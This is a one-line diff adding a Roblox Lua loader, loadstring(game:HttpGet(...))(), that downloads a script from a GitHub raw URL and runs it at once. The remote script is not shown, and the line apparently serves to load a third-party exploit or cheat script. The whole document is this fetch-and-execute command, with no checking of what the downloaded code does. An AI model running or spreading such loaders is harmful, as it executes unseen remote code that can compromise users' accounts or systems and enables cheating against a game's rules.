@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Abs0lute291/beetest/refs/heads/main/firstmode"))()
